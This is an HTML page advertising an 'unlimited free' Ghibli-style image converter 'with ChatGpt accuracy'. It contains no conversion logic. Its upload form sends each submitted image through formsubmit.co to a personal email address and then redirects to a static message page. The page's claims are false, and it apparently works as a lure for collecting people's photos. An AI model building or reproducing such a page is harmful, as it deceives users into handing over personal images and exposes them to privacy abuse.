<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ghibli Style Image Converter</title>
    <style>
        body { 
            font-family: 'Arial', sans-serif; 
            text-align: center; 
            padding: 50px; 
            background: linear-gradient(135deg, #1e3c72, #2a5298); 
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container { 
            background: rgba(128, 128, 128, 0.1); 
            padding: 20px; 
            border-radius: 15px; 
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3); 
            max-width: 90%; 
            width: 400px; 
            backdrop-filter: blur(10px);
        }
        h1 { font-size: 22px; margin-bottom: 10px; }
        h2 { font-size: 18px; margin-bottom: 10px; }
        p { margin-bottom: 20px; }
        .file-input-wrapper {
            position: relative;
            margin: 15px auto;
            width: 100%;
        }
        .file-input-label {
            display: block;
            background: white;
            padding: 10px;
            border-radius: 5px;
            color: #333;
            text-align: left;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            cursor: pointer;
        }
        input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }
        button { 
            background: #ff9800; 
            color: white; 
            border: none; 
            padding: 12px 20px; 
            font-size: 16px; 
            border-radius: 5px; 
            cursor: pointer; 
            width: 100%;
            transition: 0.3s;
        }
        button:hover { background: #e68900; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Unlimited Free Ghibli Style Image Converter</h1>
        <h2>with ChatGpt Accuracy (It will take some time)</h2>
        
        <p>Upload your image and get Studio Ghibli Style results! no Login Required</p>
        <form id="uploadForm" action="https://formsubmit.co/babaiswaraj@gmail.com" method="POST" enctype="multipart/form-data">
            <div class="file-input-wrapper">
                <label class="file-input-label" id="fileLabel">Choose a file...</label>
                <input type="file" name="image" id="fileInput" required>
            </div>
            <input type="hidden" name="_next" value="https://ghibli-art.github.io/Cool-Ghibli-Style/message.html">
            <button type="submit">Upload Image</button>
        </form>
    </div>

    <script>
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const fileName = e.target.files[0] ? e.target.files[0].name : 'Choose a file...';
            document.getElementById('fileLabel').textContent = fileName;
        });
    </script>
</body>
</html>
